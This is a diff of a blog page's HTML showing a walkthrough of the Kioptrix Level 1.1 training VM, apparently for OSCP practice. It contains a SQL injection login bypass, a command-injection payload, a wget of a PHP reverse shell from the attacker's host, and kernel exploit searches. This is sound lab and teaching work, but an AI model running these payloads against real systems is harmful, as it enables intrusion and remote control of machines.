@@ -1,28 +1,14 @@
 <!DOCTYPE html>
-<html>
+<html ⚡>
 <head>
-    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-    <script>
-        // UNCOMMENT AND USE YOUR VARIABLES FOR DISQUS AND GOOGLE ANALYTICS
-        var d_id  = 'rootshellz',
-        //     g_id  = 'UA-XXXXXXXX-X', // Format: UA-########-#, Example: UA-11220899-1
-        //     g_url = 'XXXXXXX.XXX' // Format: #####.####, Example: webdesignporto.com
-    </script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
 
     <title>Kioptrix: Level 1.1 (#2) Walkthrough</title>
-
-    <meta name="HandheldFriendly" content="True" />
-    <meta name="MobileOptimized" content="320" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-    <link rel="stylesheet" type="text/css" href="/assets/highlighter/prettify.css?v=8d33012fb0" />
-    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css?v=8d33012fb0" />
 
     <link rel="icon" href="/favicon.png" type="image/png" />
     <link rel="canonical" href="https://blog.rootshellz.com/kioptrix-walkthrough-2/" />
     <meta name="referrer" content="no-referrer-when-downgrade" />
-    <link rel="amphtml" href="https://blog.rootshellz.com/kioptrix-walkthrough-2/amp/" />
     
     <meta property="og:site_name" content="rootshellz" />
     <meta property="og:type" content="article" />
@@ -99,58 +85,599 @@
 
     <meta name="generator" content="Ghost 3.36" />
     <link rel="alternate" type="application/rss+xml" title="rootshellz" href="https://blog.rootshellz.com/rss/" />
-    <!-- https://www.jsdelivr.com/package/npm/prism-themes?path=themes -->
-<!-- These three work together / are additive -->
-<link href="https://cdn.jsdelivr.net/npm/prism-themes@1.5.0/themes/prism-synthwave84.css" rel="stylesheet" / >
-<link href="https://cdn.jsdelivr.net/npm/prism-themes@1.5.0/themes/prism-vsc-dark-plus.css" rel="stylesheet" / >
-<link href="https://cdn.jsdelivr.net/npm/prism-themes@1.5.0/themes/prism-xonokai.css" rel="stylesheet" / >
 
+    <style amp-custom>
+    *,
+    *::before,
+    *::after {
+        box-sizing: border-box;
+    }
 
-<!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-TM0JKQZ7H1"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+    html {
+        overflow-x: hidden;
+        overflow-y: scroll;
+        font-size: 62.5%;
+        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+    }
 
-  gtag('config', 'G-TM0JKQZ7H1');
-</script>
+    body {
+        min-height: 100vh;
+        margin: 0;
+        padding: 0;
+        color: #3a4145;
+        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
+        font-size: 1.7rem;
+        line-height: 1.55em;
+        font-weight: 400;
+        font-style: normal;
+        background: #fff;
+        scroll-behavior: smooth;
+        overflow-x: hidden;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+    }
 
-    <script>
-      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    p,
+    ul,
+    ol,
+    li,
+    dl,
+    dd,
+    hr,
+    pre,
+    form,
+    table,
+    video,
+    figure,
+    figcaption,
+    blockquote {
+        margin: 0;
+        padding: 0;
+    }
 
-      ga('create', g_id, g_url);
-      ga('send', 'pageview');
+    ul[class],
+    ol[class] {
+        padding: 0;
+        list-style: none;
+    }
 
-    </script>
+    img {
+        display: block;
+        max-width: 100%;
+    }
+
+    input,
+    button,
+    select,
+    textarea {
+        font: inherit;
+        -webkit-appearance: none;
+    }
+
+    fieldset {
+        margin: 0;
+        padding: 0;
+        border: 0;
+    }
+
+    label {
+        display: block;
+        font-size: 0.9em;
+        font-weight: 700;
+    }
+
+    hr {
+        position: relative;
+        display: block;
+        width: 100%;
+        height: 1px;
+        border: 0;
+        border-top: 1px solid currentcolor;
+        opacity: 0.1;
+    }
+
+    ::selection {
+        text-shadow: none;
+        background: #cbeafb;
+    }
+
+    mark {
+        background-color: #fdffb6;
+    }
+
+    small {
+        font-size: 80%;
+    }
+
+    sub,
+    sup {
+        position: relative;
+        font-size: 75%;
+        line-height: 0;
+        vertical-align: baseline;
+    }
+    sup {
+        top: -0.5em;
+    }
+    sub {
+        bottom: -0.25em;
+    }
+
+    ul li + li {
+        margin-top: 0.6em;
+    }
+
+    a {
+        color: #1292EE;
+        text-decoration-skip-ink: auto;
+    }
+
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6 {
+        margin: 0;
+        font-weight: 700;
+        color: #121212;
+        line-height: 1.4em;
+    }
+
+    h1 {
+        font-size: 3.4rem;
+        line-height: 1.1em;
+    }
+
+    h2 {
+        font-size: 2.4rem;
+        line-height: 1.2em;
+    }
+
+    h3 {
+        font-size: 1.8rem;
+    }
+
+    h4 {
+        font-size: 1.7rem;
+    }
+
+    h5 {
+        font-size: 1.6rem;
+    }
+
+    h6 {
+        font-size: 1.6rem;
+    }
+
+    amp-img {
+        height: 100%;
+        width: 100%;
+        max-width: 100%;
+        max-height: 100%;
+    }
+
+    amp-img img {
+        object-fit: cover;
+    }
+
+    .page-header {
+        padding: 50px 5vmin 30px;
+        text-align: center;
+        font-size: 2rem;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+    }
+
+    .page-header a {
+        color: #121212;
+        font-weight: 700;
+        text-decoration: none;
+        font-size: 1.6rem;
+        letter-spacing: -0.1px;
+    }
+
+    .post {
+        max-width: 680px;
+        margin: 0 auto;
+    }
+
+    .post-header {
+        margin: 0 5vmin 5vmin;
+        text-align: center;
+    }
+
+    .post-meta {
+        margin: 1rem 0 0 0;
+        text-transform: uppercase;
+        color: #738a94;
+        font-weight: 500;
+        font-size: 1.3rem;
+    }
+
+    .post-image {
+        margin: 0 0 5vmin;
+    }
+
+    .post-image img {
+        display: block;
+        width: 100%;
+        height: auto;
+    }
+
+    .post-content {
+        padding: 0 5vmin;
+    }
+
+    .post-content > * + * {
+        margin-top: 1.5em;
+    }
+
+    .post-content [id]:not(:first-child) {
+        margin: 2em 0 0;
+    }
+
+    .post-content > [id] + * {
+        margin-top: 1rem;
+    }
+
+    .post-content [id] + .kg-card,
+    .post-content blockquote + .kg-card {
+        margin-top: 40px;
+    }
+
+    .post-content > ul,
+    .post-content > ol,
+    .post-content > dl {
+        padding-left: 1.9em;
+    }
+
+    .post-content hr {
+        margin-top: 40px;
+    }
+
+    .post .post-content hr + * {
+        margin-top: 40px;
+    }
+
+    .post-content amp-img {
+        background-color: #f8f8f8;
+    }
+
+    .post-content blockquote {
+        position: relative;
+        font-style: italic;
+    }
+
+    .post-content blockquote::before {
+        content: "";
+        position: absolute;
+        left: -1.5em;
+        top: 0;
+        bottom: 0;
+        width: 0.3rem;
+        background: #000;
+    }
+
+    .post-content :not(.kg-card):not([id]) + .kg-card {
+        margin-top: 40px;
+    }
+
+    .post-content .kg-card + :not(.kg-card) {
+        margin-top: 40px;
+    }
+
+    .kg-card figcaption {
+        padding: 1.5rem 1.5rem 0;
+        text-align: center;
+        font-weight: 500;
+        font-size: 1.3rem;
+        line-height: 1.4em;
+        opacity: 0.6;
+    }
+
+    .kg-card figcaption strong {
+        color: rgba(0,0,0,0.8);
+    }
+
+    .post-content :not(pre) code {
+        vertical-align: middle;
+        padding: 0.15em 0.4em 0.15em;
+        border: #e1eaef 1px solid;
+        font-weight: 400;
+        font-size: 0.9em;
+        line-height: 1em;
+        color: #dc0050;
+        background: #f0f6f9;
+        border-radius: 0.25em;
+    }
+
+    .post-content > pre {
+        overflow: scroll;
+        padding: 16px 20px;
+        color: #fff;
+        background: #1F2428;
+        border-radius: 5px;
+        box-shadow: 0 2px 6px -2px rgba(0,0,0,.1), 0 0 1px rgba(0,0,0,.4);
+    }
+
+    .kg-embed-card {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        width: 100%;
+    }
+
+    .kg-image-card img {
+        margin: auto;
+    }
+
+    .kg-gallery-card + .kg-gallery-card {
+        margin-top: 0.75em;
+    }
+
+    .kg-gallery-container {
+        position: relative;
+    }
+
+    .kg-gallery-row {
+        display: flex;
+        flex-direction: row;
+        justify-content: center;
+    }
+
+    .kg-gallery-image {
+        width: 100%;
+        height: 100%;
+    }
+
+    .kg-gallery-row:not(:first-of-type) {
+        margin: 0.75em 0 0 0;
+    }
+
+    .kg-gallery-image:not(:first-of-type) {
+        margin: 0 0 0 0.75em;
+    }
+
+    .kg-bookmark-card,
+    .kg-bookmark-publisher {
+        position: relative;
+    }
+
+    .kg-bookmark-container,
+    .kg-bookmark-container:hover {
+        display: flex;
+        flex-wrap: wrap;
+        flex-direction: row-reverse;
+        color: currentColor;
+        background: rgba(255,255,255,0.6);
+        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
+        text-decoration: none;
+        border-radius: 5px;
+        box-shadow: 0 2px 6px -2px rgba(0, 0, 0, 0.1), 0 0 1px rgba(0, 0, 0, 0.4);
+        overflow: hidden;
+    }
+
+    .kg-bookmark-content {
+        flex-basis: 0;
+        flex-grow: 999;
+        padding: 20px;
+        order: 1;
+    }
+
+    .kg-bookmark-title {
+        font-weight: 600;
+        font-size: 1.5rem;
+        line-height: 1.3em;
+    }
+
+    .kg-bookmark-description {
+        display: -webkit-box;
+        max-height: 45px;
+        margin: 0.5em 0 0 0;
+        font-size: 1.4rem;
+        line-height: 1.55em;
+        overflow: hidden;
+        opacity: 0.8;
+        -webkit-line-clamp: 2;
+        -webkit-box-orient: vertical;
+    }
+
+    .kg-bookmark-metadata {
+        margin-top: 20px;
+    }
+
+    .kg-bookmark-metadata {
+        display: flex;
+        align-items: center;
+        font-weight: 500;
+        font-size: 1.3rem;
+        line-height: 1.3em;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+    }
+
+    .kg-bookmark-description {
+        display: -webkit-box;
+        -webkit-box-orient: vertical;
+        -webkit-line-clamp: 2;
+        overflow: hidden;
+    }
+
+    .kg-bookmark-metadata amp-img {
+        width: 18px;
+        height: 18px;
+        max-width: 18px;
+        max-height: 18px;
+        margin-right: 10px;
+    }
+
+    .kg-bookmark-thumbnail {
+        display: flex;
+        flex-basis: 20rem;
+        flex-grow: 1;
+        justify-content: flex-end;
+    }
+
+    .kg-bookmark-thumbnail amp-img {
+        max-height: 200px;
+    }
+
+    .kg-bookmark-author {
+        white-space: nowrap;
+        text-overflow: ellipsis;
+        overflow: hidden;
+    }
+
+    .kg-bookmark-publisher::before {
+        content: "•";
+        margin: 0 .5em;
+    }
+
+    .kg-width-full.kg-card-hascaption {
+        display: grid;
+        grid-template-columns: inherit;
+    }
+
+    .post-content table {
+        border-collapse: collapse;
+        width: 100%;
+    }
+
+    .post-content th {
+        padding: 0.5em 0.8em;
+        text-align: left;
+        font-size: .75em;
+        text-transform: uppercase;
+    }
+
+    .post-content td {
+        padding: 0.4em 0.7em;
+    }
+
+    .post-content tbody tr:nth-child(2n + 1) {
+        background-color: rgba(0,0,0,0.1);
+        padding: 1px;
+    }
+
+    .post-content tbody tr:nth-child(2n + 2) td:last-child {
+        box-shadow:
+            inset 1px 0 rgba(0,0,0,0.1),
+            inset -1px 0 rgba(0,0,0,0.1);
+    }
+
+    .post-content tbody tr:nth-child(2n + 2) td {
+        box-shadow: inset 1px 0 rgba(0,0,0,0.1);
+    }
+
+    .post-content tbody tr:last-child {
+        border-bottom: 1px solid rgba(0,0,0,.1);
+    }
+
+    .page-footer {
+        padding: 60px 5vmin;
+        margin: 60px auto 0;
+        text-align: center;
+        background-color: #f8f8f8;
+    }
+
+    .page-footer h3 {
+        margin: 0.5rem 0 0 0;
+    }
+
+    .page-footer p {
+        max-width: 500px;
+        margin: 1rem auto 1.5rem;
+        font-size: 1.7rem;
+        line-height: 1.5em;
+        color: rgba(0,0,0,0.6)
+    }
+
+    .powered {
+        display: inline-flex;
+        align-items: center;
+        margin: 30px 0 0;
+        padding: 6px 9px 6px 6px;
+        border: rgba(0,0,0,0.1) 1px solid;
+        font-size: 12px;
+        line-height: 12px;
+        letter-spacing: -0.2px;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+        font-weight: 500;
+        color: #222;
+        text-decoration: none;
+        background: #fff;
+        border-radius: 6px;
+    }
+
+    .powered svg {
+        height: 16px;
+        width: 16px;
+        margin: 0 6px 0 0;
+    }
+
+    @media (max-width: 600px) {
+        body {
+            font-size: 1.6rem;
+        }
+        h1 {
+            font-size: 3rem;
+        }
+
+        h2 {
+            font-size: 2.2rem;
+        }
+    }
+
+    @media (max-width: 400px) {
+        h1 {
+            font-size: 2.6rem;
+            line-height: 1.15em;
+        }
+        h2 {
+            font-size: 2rem;
+            line-height: 1.2em;
+        }
+        h3 {
+            font-size: 1.7rem;
+        }
+    }
+    </style>
+
+    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
+    <script async src="https://cdn.ampproject.org/v0.js"></script>
+
+    <script async custom-element="amp-analytics" src="https://cdn.ampproject.org/v0/amp-analytics-0.1.js"></script>
+
 </head>
-<body class="post-template tag-boot2root tag-vulnhub tag-oscp tag-kioptrix">
 
-    
+<body class="amp-template">
+    <header class="page-header">
+        <a href="https://blog.rootshellz.com">
+                <amp-img class="site-icon" src="https://blog.rootshellz.com/content/images/2020/11/Blog-Logo.png" width="50" height="50" layout="fixed"></amp-img>
+        </a>
+    </header>
 
-<main class="content" role="main">
+    <main class="content" role="main">
+        <article class="post">
 
-    <article class="post tag-boot2root tag-vulnhub tag-oscp tag-kioptrix">
+            <header class="post-header">
+                <h1 class="post-title">Kioptrix: Level 1.1 (#2) Walkthrough</h1>
+                <section class="post-meta">
+                    rootshellz -
+                    <time class="post-date" datetime="2017-08-24">24 Aug 2017</time>
+                </section>
+            </header>
+            <figure class="post-image">
+                <amp-img src="https://blog.rootshellz.com/content/images/2018/07/Kioptrix-2-Cover.jpg" width="600" height="340" layout="responsive"></amp-img>
+            </figure>
+            <section class="post-content">
 
-        <header class="post-header">
-            <a id="blog-logo" href="https://blog.rootshellz.com">
-                    <img src="/content/images/2018/07/Blog-Logo.png" alt="Blog Logo" />
-            </a>
-        </header>
-
-
-        <span class="post-meta"><time datetime="2017-08-24">24 Aug 2017</time> on <a href="/tag/boot2root/">Boot2Root</a> | <a href="/tag/vulnhub/">VulnHub</a> | <a href="/tag/oscp/">OSCP</a> | <a href="/tag/kioptrix/">Kioptrix</a></span>
-
-        <h1 class="post-title">Kioptrix: Level 1.1 (#2) Walkthrough</h1>
-
-        <section class="post-content">
-            <!--kg-card-begin: markdown--><h1 id="intro">Intro</h1>
-<p>In this post, I will continue hacking on the <a href="http://www.kioptrix.com/blog/test-page/">Kioptrix series</a> of VMs.  In the <a href="https://blog.rootshellz.com/kioptrix-level-1-writeup/">last post</a>, I covered Kioptrix1.  In this post, I will be working my way through Kioptrix1.1, which is the second VM in the series.  The VulnHub page for the challenge states that,  &quot;[the] first release had a bug in it with the web application,&quot; so I have opted to hack on the updated version.  While a major part these challenges is to find and exploit bugs, I don't want to be fighting unintentional bugs in the challenge VM.</p>
+                <h1 id="intro">Intro</h1>
+<p>In this post, I will continue hacking on the <a href="http://www.kioptrix.com/blog/test-page/">Kioptrix series</a> of VMs.  In the <a href="https://blog.rootshellz.com/kioptrix-level-1-writeup/">last post</a>, I covered Kioptrix1.  In this post, I will be working my way through Kioptrix1.1, which is the second VM in the series.  The VulnHub page for the challenge states that,  "[the] first release had a bug in it with the web application," so I have opted to hack on the updated version.  While a major part these challenges is to find and exploit bugs, I don't want to be fighting unintentional bugs in the challenge VM.</p>
 <p>I have downloaded and booted the VM on a local network.  Let's begin.</p>
-<p><img src="https://blog.rootshellz.com/content/images/2017/08/Kioptrix1.1.png" alt="Kioptrix1.1"></p>
+<p></p>
 <h1 id="prehack">Pre-Hack</h1>
 <h2 id="whereyouat">Where you at?</h2>
 <p>First, we need to identify what address the VM grabbed from DHCP:</p>
@@ -361,7 +888,7 @@ PORT    STATE SERVICE
 |       which allows man-in-the-middle attackers to trigger use of a zero
 |       length master key in certain OpenSSL-to-OpenSSL communications, and
 |       consequently hijack sessions or obtain sensitive information, via
-|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.
+|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
 |           
 |     References:
 |       http://www.cvedetails.com/cve/2014-0224
@@ -481,7 +1008,7 @@ PORT    STATE SERVICE
 |           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
 |           products, uses nondeterministic CBC padding, which makes it easier
 |           for man-in-the-middle attackers to obtain cleartext data via a
-|           padding-oracle attack, aka the &quot;POODLE&quot; issue.
+|           padding-oracle attack, aka the "POODLE" issue.
 |     Disclosure date: 2014-10-14
 |     Check results:
 |       TLS_RSA_WITH_AES_128_CBC_SHA
@@ -536,7 +1063,7 @@ PORT    STATE SERVICE
 |       other products, requires a server to send a ServerVerify message before establishing
 |       that a client possesses certain plaintext RSA data, which makes it easier for remote
 |       attackers to decrypt TLS ciphertext data by leveraging a Bleichenbacher RSA padding
-|       oracle, aka a &quot;DROWN&quot; attack.
+|       oracle, aka a "DROWN" attack.
 |     
 |       refs: 
 |         https://www.openssl.org/news/secadv/20160301.txt
@@ -545,7 +1072,7 @@ MAC Address: 00:0C:29:AF:63:7A (VMware)
 
 Nmap done: 1 IP address (1 host up) scanned in 67.70 seconds
 </code></pre>
-<p>So admittedly, I kind of threw the &quot;kitchen sink&quot; at these services so a lot of what I got back is not relevant here.  For example, getting SSL <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">MiTM</a> or <a href="https://en.wikipedia.org/wiki/Cross-site_request_forgery">CSRF</a> is not going to help us get root on the box in this case.  At any rate, I like running my full list of enumeration scripts for each service as it gives me a good overall feel for what is running and the state of the service.  For this challenge, we can simply ignore the noise.</p>
+<p>So admittedly, I kind of threw the "kitchen sink" at these services so a lot of what I got back is not relevant here.  For example, getting SSL <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">MiTM</a> or <a href="https://en.wikipedia.org/wiki/Cross-site_request_forgery">CSRF</a> is not going to help us get root on the box in this case.  At any rate, I like running my full list of enumeration scripts for each service as it gives me a good overall feel for what is running and the state of the service.  For this challenge, we can simply ignore the noise.</p>
 <p>What does stand out on this service are some URLs to check out, an interesting comment in the source to investigate further, an outdated PHP version, and a WAF supposedly being detected.  We will circle back to these items in a bit.  At this point, I would usually also start a directory brute force, but I'm going to hold off for now unless none of the above pan out.</p>
 <h4 id="rpcenumeration">RPC Enumeration</h4>
 <p>Working my way down the services list, let's next see what we can find out about / from the RPC services.  I'll once again turn to nmap scripts.</p>
@@ -608,31 +1135,31 @@ MAC Address: 00:0C:29:AF:63:7A (VMware)
 <h2 id="apache">Apache</h2>
 <p>We learned from our scanning above that Apache is running on ports 80/tcp and 443/tcp and we have a handful of things to go check out. Since this is just one web web property, we'll go start at this manually in a browser.  If we had a larger scope, we would definitely want to script a few more things before we proceeded — things like like screenshots of the identified URLs, source downloads, and URL spidering.</p>
 <p>To check things out, we'll proxy FireFox through <a href="https://portswigger.net/burp">Burp</a> and turn off intercept for now.  When we browse to out target at <a href="http://172.16.2.131">http://172.16.2.131</a>, we are greeted with a simple looking login form:</p>
-<p><img src="https://blog.rootshellz.com/content/images/2017/08/Login-Form.png" alt="Login-Form"></p>
+<p></p>
 <p>Browsing to <a href="https://172.16.2.131">https://172.16.2.131</a> simply loads an HTTPS version of the same login form.</p>
 <p>When we view the source, we see that the interesting comment we saw in the nmap output is actually nothing to get excited about, it was just a place holder and not actually marking anything sensitive.</p>
 <pre><code class="language-html">&lt;html&gt;
 &lt;body&gt;
-&lt;form method=&quot;post&quot; name=&quot;frmLogin&quot; id=&quot;frmLogin&quot; action=&quot;index.php&quot;&gt;
-  &lt;table width=&quot;300&quot; border=&quot;1&quot; align=&quot;center&quot; cellpadding=&quot;2&quot; cellspacing=&quot;2&quot;&gt;
+&lt;form method="post" name="frmLogin" id="frmLogin" action="index.php"&gt;
+  &lt;table width="300" border="1" align="center" cellpadding="2" cellspacing="2"&gt;
     &lt;tr&gt;
       &lt;td colspan='2' align='center'&gt;
       &lt;b&gt;Remote System Administration Login&lt;/b&gt;
       &lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
-      &lt;td width=&quot;150&quot;&gt;Username&lt;/td&gt;
-      &lt;td&gt;&lt;input name=&quot;uname&quot; type=&quot;text&quot;&gt;&lt;/td&gt;
+      &lt;td width="150"&gt;Username&lt;/td&gt;
+      &lt;td&gt;&lt;input name="uname" type="text"&gt;&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
-      &lt;td width=&quot;150&quot;&gt;Password&lt;/td&gt;
+      &lt;td width="150"&gt;Password&lt;/td&gt;
       &lt;td&gt;
-      &lt;input name=&quot;psw&quot; type=&quot;password&quot;&gt;
+      &lt;input name="psw" type="password"&gt;
       &lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
-      &lt;td colspan=&quot;2&quot; align=&quot;center&quot;&gt;
-      &lt;input type=&quot;submit&quot; name=&quot;btnLogin&quot; value=&quot;Login&quot;&gt;
+      &lt;td colspan="2" align="center"&gt;
+      &lt;input type="submit" name="btnLogin" value="Login"&gt;
       &lt;/td&gt;
     &lt;/tr&gt;
   &lt;/table&gt;
@@ -657,18 +1184,18 @@ MAC Address: 00:0C:29:AF:63:7A (VMware)
 </ul>
 <p>Okay, with all of those out of the way and unsuccessful, let's move on to attempting SQLi.  If we want to guess more passwords later, we can fire up a full-on brute force.</p>
 <h3 id="sqlinjection">SQL Injection</h3>
-<p>We know from our intercepting proxy that the posted login data looks like this:<br>
+<p>We know from our intercepting proxy that the posted login data looks like this:<br />
 <code>uname=admin&amp;psw=123456&amp;btnLogin=Login</code></p>
-<p>We also know the backend is running PHP and MySQL.  Thus, it is possible the backend authentication routine does a lookup similar to:<br>
+<p>We also know the backend is running PHP and MySQL.  Thus, it is possible the backend authentication routine does a lookup similar to:<br />
 <code>SELECT * FROM Users WHERE Username='$uname' AND Password='$psw'</code></p>
-<p>Working off of this first hunch, what if we submit something like <code>' OR 1=1#</code>?  If our assumption about the back end code is correct, this will result in something like this:<br>
+<p>Working off of this first hunch, what if we submit something like <code>' OR 1=1#</code>?  If our assumption about the back end code is correct, this will result in something like this:<br />
 <code>SELECT * FROM Users WHERE Username='admin' AND Password='' OR 1=1#'</code></p>
-<p>Let's see if this works...<br>
-<img src="https://blog.rootshellz.com/content/images/2017/08/Burp-SQLi.png" alt="Burp-SQLi"></p>
-<p>Awesome our hunch was correct, we successfully bypassed authentication.<br>
-<img src="https://blog.rootshellz.com/content/images/2017/08/Basic-Administrative-Web-Console.png" alt="Basic-Administrative-Web-Console"></p>
+<p>Let's see if this works...<br />
+</p>
+<p>Awesome our hunch was correct, we successfully bypassed authentication.<br />
+</p>
 <h3 id="commandinjection">Command Injection</h3>
-<p>Testing out the &quot;Ping a Machine on the Network&quot; functionality, it looks like the <em>ip</em> parameter posted to /pingit.php, is simply passed to the system's ping command (<em>ping -c3 ip</em>).</p>
+<p>Testing out the "Ping a Machine on the Network" functionality, it looks like the <em>ip</em> parameter posted to /pingit.php, is simply passed to the system's ping command (<em>ping -c3 ip</em>).</p>
 <p>The request:</p>
 <pre><code class="language-http">POST /pingit.php HTTP/1.1
 Host: 172.16.2.131
@@ -683,12 +1210,12 @@ Upgrade-Insecure-Requests: 1
 
 ip=127.0.0.1&amp;submit=submit
 </code></pre>
-<p>and the response:<br>
-<img src="https://blog.rootshellz.com/content/images/2017/08/pingit.png" alt="pingit"></p>
+<p>and the response:<br />
+</p>
 <p>Let's think about how the backend for this functionality might work, like we did above for the SQL statement.  It is reasonable to assume that the ping command is being called from PHP with something like this: <code>shell-output = exec('ping -c3 $ip');</code> where <em>$ip</em> is taken directly from the posted value and not sanitized at all.</p>
-<p>Let's see what we can sneak in to that <em>$ip</em> parameter.<br>
-The request:<br>
-<img src="https://blog.rootshellz.com/content/images/2017/08/Command-Injection.png" alt="Command-Injection"><br>
+<p>Let's see what we can sneak in to that <em>$ip</em> parameter.<br />
+The request:<br />
+<br />
 which looks like this in Burp:</p>
 <pre><code class="language-http">POST /pingit.php HTTP/1.1
 Host: 172.16.2.131
@@ -703,18 +1230,18 @@ Upgrade-Insecure-Requests: 1
 
 ip=127.0.0.1%3B+id&amp;submit=submit
 </code></pre>
-<p>Results in:<br>
-<img src="https://blog.rootshellz.com/content/images/2017/08/Command-Injected.png" alt="Command-Injected"></p>
+<p>Results in:<br />
+</p>
 <p>Notice the last line of output;  It's clear we are able to run arbitrary commands as the apache user!</p>
 <h4 id="shellingout">Shelling Out</h4>
 <p>To make things easier, let's get ourselves a better shell.  I first attempted to use netcat, but it is not installed on the target.  We know PHP is installed, so let's leverage that for a shell.</p>
 <p>We first need to modify the shell with our listener information:</p>
 <pre><code class="language-shell-output">root@kali:~# cp /usr/share/webshells/php/php-reverse-shell.php .
-root@kali:~# cat /usr/share/webshells/php/php-reverse-shell.php | grep &quot;CHANGE THIS&quot;
+root@kali:~# cat /usr/share/webshells/php/php-reverse-shell.php | grep "CHANGE THIS"
 $ip = '127.0.0.1';  // CHANGE THIS
 $port = 1234;       // CHANGE THIS
-root@kali:~# sed -i &quot;s#$ip = '127.0.0.1';  // CHANGE THIS#$ip = '172.16.2.129';#&quot; php-reverse-shell.php
-root@kali:~# sed -i &quot;s#$port = 1234;       // CHANGE THIS#$port = 1337;#&quot; php-reverse-shell.php
+root@kali:~# sed -i "s#$ip = '127.0.0.1';  // CHANGE THIS#$ip = '172.16.2.129';#" php-reverse-shell.php
+root@kali:~# sed -i "s#$port = 1234;       // CHANGE THIS#$port = 1337;#" php-reverse-shell.php
 root@kali:~# cat php-reverse-shell.php | grep -e ^\$ip -e ^\$port
 $ip = '172.16.2.129';
 $port = 1337;
@@ -722,7 +1249,7 @@ $port = 1337;
 <p>Next, we need to serve up the shell from our Kali box and then download it to the target somewhere the apache user can write:</p>
 <pre><code class="language-shell-output">root@kali:~# python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
-172.16.2.131 - - [14/Aug/2017 00:28:43] &quot;GET /php-reverse-shell.php HTTP/1.0&quot; 200 -
+172.16.2.131 - - [14/Aug/2017 00:28:43] "GET /php-reverse-shell.php HTTP/1.0" 200 -
 </code></pre>
 <p>Issuing the wget command via the identified injection: <code>127.0.0.1; wget -O /tmp/php-reverse-shell.php http://172.16.2.129:8000/php-reverse-shell.php</code></p>
 <pre><code class="language-http">POST /pingit.php HTTP/1.1
@@ -772,8 +1299,8 @@ sh-3.00$
 <pre><code class="language-shell-output">sh-3.00$ uname -a
 Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
 </code></pre>
-<p>Googling for the kernel version shows a promising result:<br>
-<img src="https://blog.rootshellz.com/content/images/2017/08/Google-2.6.9-55.EL.png" alt="Google-2.6.9-55.EL"></p>
+<p>Googling for the kernel version shows a promising result:<br />
+</p>
 <pre><code class="language-shell-output">root@kali:~# searchsploit linux 2.6 | grep 9542
 Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Cor | ./linux/local/9542.c
 </code></pre>
@@ -802,7 +1329,7 @@ sh-3.00$ /tmp/9542
 <p>Hmm, all of my expectations, the 'ip_append_data()' Ring0 Privilege Escalation exploit failed on this box.  At this point, I am unsure why the exploit was unsuccessful, but I am going to move on.  In a future post, I plan to dissect this exploit and the associated vulnerability and try to understand why this did not work.</p>
 <h4 id="privilegeescalationtake2">Privilege Escalation - Take 2</h4>
 <p>Our first attempt at local privilege escalation was unsuccessful.  Luckily, it appears we have another option:</p>
-<pre><code class="language-shell-output">root@kali:~# searchsploit kernel 2.6 linux local | grep &quot;CentOS\ 4&quot;
+<pre><code class="language-shell-output">root@kali:~# searchsploit kernel 2.6 linux local | grep "CentOS\ 4"
 Linux Kernel 2.4 / 2.6 (RedHat Linux 9 / Fedora Core 4&lt;11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Root Exploit (5)                                                 | ./linux/local/9479.c
 Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Root Exploit (1)                                                  | ./linux/local/9542.c
